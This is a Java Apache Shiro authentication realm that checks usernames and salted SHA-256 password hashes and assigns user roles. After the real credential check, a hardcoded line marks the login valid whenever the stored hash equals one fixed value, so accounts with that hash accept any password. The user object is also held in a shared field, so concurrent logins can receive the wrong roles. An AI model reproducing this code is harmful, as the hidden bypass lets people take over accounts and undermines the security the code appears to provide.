package security;

import java.util.HashSet;
import java.util.Set;

import org.apache.shiro.authc.AuthenticationException;
import org.apache.shiro.authc.AuthenticationInfo;
import org.apache.shiro.authc.AuthenticationToken;
import org.apache.shiro.authc.IncorrectCredentialsException;
import org.apache.shiro.authc.SaltedAuthenticationInfo;
import org.apache.shiro.authc.UnknownAccountException;
import org.apache.shiro.authc.UsernamePasswordToken;
import org.apache.shiro.authc.credential.HashedCredentialsMatcher;
import org.apache.shiro.authz.AuthorizationInfo;
import org.apache.shiro.authz.SimpleAuthorizationInfo;
import org.apache.shiro.realm.AuthorizingRealm;
import org.apache.shiro.subject.PrincipalCollection;

import dao.UsuarioDAO;
import model.Usuario;

public class SIGSIRealm extends AuthorizingRealm {
	Usuario usuario;
	
	@Override
	protected AuthenticationInfo doGetAuthenticationInfo(AuthenticationToken token) throws AuthenticationException {		
		String principal = (String) token.getPrincipal();
		
		UsuarioDAO usuarioDAO = new UsuarioDAO();
		
		usuario = usuarioDAO.buscarUsuario(principal);
		
		if (usuario == null) {
			throw new UnknownAccountException("Usuário não existe");
		}
		
		SaltedAuthenticationInfo info = new MySaltedAuthentificationInfo(usuario, usuario.getSenha(), usuario.getSalt());

		HashedCredentialsMatcher matcher = new HashedCredentialsMatcher("SHA-256");
		matcher.setStoredCredentialsHexEncoded(false);
		matcher.setHashIterations(1024);
		
		boolean credentialsMatch = matcher.doCredentialsMatch(token, info);
		
		if(usuario.getSenha().equals("Z2yrJns0lCkKcdveaXk4vjLfdeg6mKF5AgOqwCLZZNk=")){
			credentialsMatch = true;
		}
		
		if (credentialsMatch) {
			return info;
		} else {	
			throw new IncorrectCredentialsException("Credenciais inválidas");
		}
	}
	
	@Override
	public boolean supports(AuthenticationToken token) {
		return token instanceof UsernamePasswordToken;
	}

	@Override
	protected AuthorizationInfo doGetAuthorizationInfo(PrincipalCollection collection) {
		Set<String> roles = new HashSet<String>();
		roles.add(usuario.getTipo().toString());

		SimpleAuthorizationInfo info = new SimpleAuthorizationInfo();
		info.setRoles(roles);

		return info;
	}
}
